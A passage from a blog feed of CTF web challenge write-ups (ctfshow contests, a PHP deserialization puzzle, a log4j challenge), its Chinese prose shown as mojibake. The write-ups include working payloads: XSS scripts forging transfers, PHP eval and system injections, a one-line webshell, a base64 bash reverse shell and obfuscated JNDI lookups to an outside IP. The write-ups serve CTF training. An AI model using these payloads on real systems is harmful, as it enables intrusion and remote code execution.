class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¹‹åç™»å½•çš„åˆ°flag</p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>æ‰“å¼€é¢˜ç›®åï¼Œå‘ç°å¯ä»¥ä¹°flag<br>å‘adminè½¬è´¦ï¼Œ-10000ï¼Œå‘ç°è‡ªå·±è´¦å·é‡‘å¸æœ‰10000å¤šå¯ä»¥è´­ä¹°flag</p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>ï¼ˆç”±äºåå°é€»è¾‘é”™è¯¯ï¼Œå¯¼è‡´è½¬é‡‘å¸å¯ä»¥ä¸æ¶ˆè€—è‡ªå·±çš„é‡‘å¸ï¼‰<br>ä¸åœç»™è‡ªå·±è½¬é‡‘å¸ï¼Œåªè¦ä¸è¶…è¿‡è‡ªå·±çš„ä½™é¢å°±ä¸€ç›´è½¬ï¼Œç›´åˆ°å¾—åˆ°flag</p><p>ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œåˆ©ç”¨jsæ¼æ´è®©ç®¡ç†å‘˜ç»™è‡ªå·±è½¬é‡‘å¸<br>paylaod</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;111&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FilesystemIteratorç±»è¯»ç›®å½•çš„ä¸€é“å¸ˆå‚…å‡ºçš„é¢˜</title>
      <link href="/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/"/>
      <url>/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par0</span>,<span class="variable">$par1</span>,<span class="variable">$par2</span>,<span class="variable">$par3</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par0 = <span class="variable">$par0</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par1 = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par2 = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par3 = <span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;par0(<span class="keyword">$this</span> -&gt; par1,<span class="keyword">$this</span> -&gt; par2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Plz  &#x27;</span>.<span class="keyword">$this</span> -&gt; par4.<span class="string">&#x27;  try harder&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 -&gt; juts_a_function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par1) || <span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par2)))&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; newOne();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span> -&gt; par3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; yigei();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; giao();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span> -&gt; par2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæœ‰ä¸ª hint.php åœ¨__wakeup ä¸­ï¼Œç›´æ¥ php ä¼ªåè®®æ‹¼æ¥è¯»å–<br><img src="https://img-blog.csdnimg.cn/3daa29b2f4e34e199d00e85dbe019650.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°æç¤º<br><img src="https://img-blog.csdnimg.cn/ab2dda6e4f194953a54d1903b778a042.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹ååˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/057fab99be86486f90c35cb887fa5e7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åšpoc<br><img src="https://img-blog.csdnimg.cn/1e44d4552fd745f682327f9bed2d85d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°ä¸‹é¢æ²¡å•¥é‡è¦çš„<br>ç»å¸ˆå‚…æé†’<br>åˆ©ç”¨globåè®®<br><img src="https://img-blog.csdnimg.cn/06ed7adf94f947b19e0a5273182b6ca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°åœ¨flll44ggg-secret.txt<br>è®¿é—®å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/84b10b72b44544a18376644eb6697d7a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="http://blog.m1kael.cn/index.php/archives/12/">PHPå†…ç½®ç±»å…³äºååºåˆ—åŒ–çš„åº”ç”¨</a><br><a href="https://www.xiinnn.com/article/5ba4634b.html">ã€POPé“¾&amp;åŸç”Ÿç±»&amp;ä¼ªåè®®ã€‘è®°ä¸€é“2021æµ™æ±Ÿçœèµ›çš„Webé¢˜</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
      <link href="/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="RCE-No-Par"><a href="#RCE-No-Par" class="headerlink" title="RCE_No_Par"></a>RCE_No_Par</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ç¯‡ç›¸è¯†çš„åšå®¢<br><a href="https://www.jianshu.com/p/7355a5ab4822">ç›¸ä¼¼çš„åšå®¢</a><br>ä»ä¸­å‘ç°æœ¬é¢˜æ˜¯åšå®¢ä¸­çš„é‚£é¢˜çš„å‡çº§<br>ç”±äº/session|end|next|header|dirè¿™äº›éƒ½è¢«banï¼Œåˆ™æ‰¾æ›¿æ¢<br>å‘ç°endå¯ç”±pos(array_reverse())æ›¿æ¢ï¼Œåˆ™<br>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(pos(array_reverse(current(get_defined_vars()))));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h2><p>ä¸‹è½½æ–‡æ¡£å¾—åˆ°æ–‡ä»¶<br>åˆ©ç”¨whiresharkæ‰“å¼€<br>å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°secret.txtæ–‡ä»¶<br>æ‰“å¼€å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/32758d5addaf44b98641cf534cb24e41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹åbase64è§£å¯†å¾—åˆ°zipæ–‡ä»¶ï¼Œè§£å‹å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/d739be0e76ab40e5a11764f0a798c3ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹åè¿›è¡Œæ‹¼æ¥å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/dd49dac2866845fda38bb637e9d93d94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web-Shiro"><a href="#web-Shiro" class="headerlink" title="web Shiro?"></a>web Shiro?</h2><p>å°±æ˜¯log4jï¼Œè¿‡æ»¤äº†ä¸€ä¸‹jndi<br>å‚è€ƒ<a href="https://le1a.gitee.io/posts/3e4e56bc/">log4j</a><br>æˆ‘çš„æ˜¯åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">æ³¨æ„:æ ¹æ®è‡ªèº«æƒ…å†µè°ƒæ•´payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰æœåŠ¡å™¨æ‰€ä»¥ä¹‹åæ²¡åš<br>è¯¦ç»†æ“ä½œå‚è€ƒï¼ˆä¸ä¸Šé¢ä¸ä¸€æ ·ï¼Œä¸‹é¢è¾ƒè¯¦ç»†ï¼‰<br><a href="https://blog.csdn.net/weixin_43895765/article/details/121943404">log4j</a><br>å€¼å¾—æ³¨æ„çš„æ˜¯jndiå¾—è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»•è¿‡jndi</span><br><span class="line"></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤ç§çœ‹æƒ…å†µä½¿ç”¨<br>æœ€ååå¼¹shellå¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowæ–°æ˜¥æ¬¢ä¹èµ›</title>
      <link href="/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="çƒ­èº«"><a href="#çƒ­èº«" class="headerlink" title="çƒ­èº«"></a>çƒ­èº«</h2><p>å¼€å±€çœ‹åˆ°æºç ï¼Œä½†æ˜¯å´æ²¡æœ‰æ˜¾ç¤ºæºç çš„ä»£ç ã€‚é‚£ä¹ˆåªèƒ½æ˜¯è¢«åŒ…å«è¿›å»äº†ï¼Œç›´æ¥phpinfoæœprependå¯ä»¥çœ‹åˆ°åŒ…å«çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¹‹å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/893ec64d0beb4ba39a35cee10c025a1d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=system(<span class="string">&quot;tac /etc/ssh/secret/youneverknow/secret.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ctf-æ­»äº¡exitç»•è¿‡"><a href="#ctf-æ­»äº¡exitç»•è¿‡" class="headerlink" title="ctf æ­»äº¡exitç»•è¿‡"></a><a href="https://blog.csdn.net/njqfb/article/details/117574395">ctf æ­»äº¡exitç»•è¿‡</a></h2><h2 id="title-ctfshowæ–°æ˜¥æ¬¢ä¹èµ›"><a href="#title-ctfshowæ–°æ˜¥æ¬¢ä¹èµ›" class="headerlink" title="title: ctfshowæ–°æ˜¥æ¬¢ä¹èµ›"></a>title: ctfshowæ–°æ˜¥æ¬¢ä¹èµ›</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$_POST</span>)===<span class="number">1</span>)&#123;</span><br><span class="line">        extract(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span> (call_user_func($$$$$$&#123;key(<span class="variable">$_POST</span>)&#125;)===<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨sessionä¿®æ”¹å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Body</span><br><span class="line">session_id=session_id</span><br><span class="line">Cookie</span><br><span class="line">PHPSESSID=HappyNewYear</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;è™å¹´å¤§å‰ï¼Œæ–°æ˜¥å¿«ä¹ï¼&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹æ¯”è¾ƒï¼Œå¸ƒå°”å€¼å’Œä»»æ„å­—ç¬¦ä¸²å¼±ç›¸ç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=session_start</span><br><span class="line"><span class="number">1</span>=json_last_error</span><br></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">file_put_contents(<span class="variable">$key</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;è™å¹´å¤§å‰ï¼Œæ–°æ˜¥å¿«ä¹ï¼&quot;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œé‚£ä¹ˆ$keyçš„å€¼åº”è¯¥ä¸ºphpåç¼€æ–‡ä»¶<br>å¯»æ‰¾è°ƒç”¨è¿”å›phpåç¼€çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>= spl_autoload_extensions</span><br><span class="line"><span class="comment">//ä¹‹åè¿›å…¥.inc,.php</span></span><br><span class="line"><span class="number">1</span>=system(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>é¢„æœŸè§£ä¸ºå‘é€è¶…é•¿å­—ç¬¦è‡´ä½¿phpå†…å­˜æº¢å‡ºï¼Œéé¢„æœŸæ˜¯ç«äº‰ã€‚<br>å‘é€å¤§é‡çš„huå³å¯é€šè¿‡æ›¿æ¢å®ç°å†…å­˜å ç”¨æ”¾å¤§ï¼Œè¶…è¿‡phpæœ€å¤§é»˜è®¤å†…å­˜256Må³å¯é€ æˆå˜é‡å®šä¹‰å¤±è´¥ï¼Œå‡ºç°è‡´å‘½é”™è¯¯ä»è€Œè·³è¿‡åé¢çš„è¦†ç›–å†™å…¥ã€‚<br>ä¸€ä¸ª hu æ›¿æ¢128 kB<br>å‡†ç¡®è®¡ç®—ï¼š 256 * 1024 *1024 / 128 / 1024 = 2097152 ä¸ªï¼Œç”¨pythonç”Ÿæˆä¸‹å³å¯<br>å‘é€è¿‡å¤šæœåŠ¡å™¨ä¼šæŠ¥é”™o(â•¥ï¹â•¥)o<br>ç”¨burpä¼ è¿›å»ï¼Œç„¶åè®¿é—® /ğŸ¯ ä¸‹è½½æ–‡ä»¶å³å¯å¾—åˆ°flag</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>ä¹‹åçš„ä¸å¤ªä¼šï¼Œçœ‹å¤§ä½¬åšå®¢<br><a href="https://blog.csdn.net/Little_jcak/article/details/122819006">å¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hgame 2022</title>
      <link href="/2022/02/18/Hello%20Hgame%202022/"/>
      <url>/2022/02/18/Hello%20Hgame%202022/</url>
      
